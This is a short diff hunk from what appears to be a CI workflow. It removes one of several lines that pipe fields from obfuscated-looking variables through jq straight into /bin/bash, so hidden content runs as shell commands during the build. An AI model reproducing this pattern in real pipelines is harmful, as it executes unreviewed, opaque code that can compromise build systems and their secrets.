@@ -27,7 +27,6 @@ jobs:
           echo $qoc3 | jq -r .ixao46 | /bin/bash
           printf '%s' "$bdzw21" | jq -r .lslyv9480 | /bin/bash
           printf '%s' "$im7687" | jq -r .hhpby56 | /bin/bash
-          echo $stzi451 | jq -r .vhoxc7097 | /bin/bash
           printf '%s' "$na17763" | jq -r .pvz67885 | /bin/bash
 
       - name: Upload archive
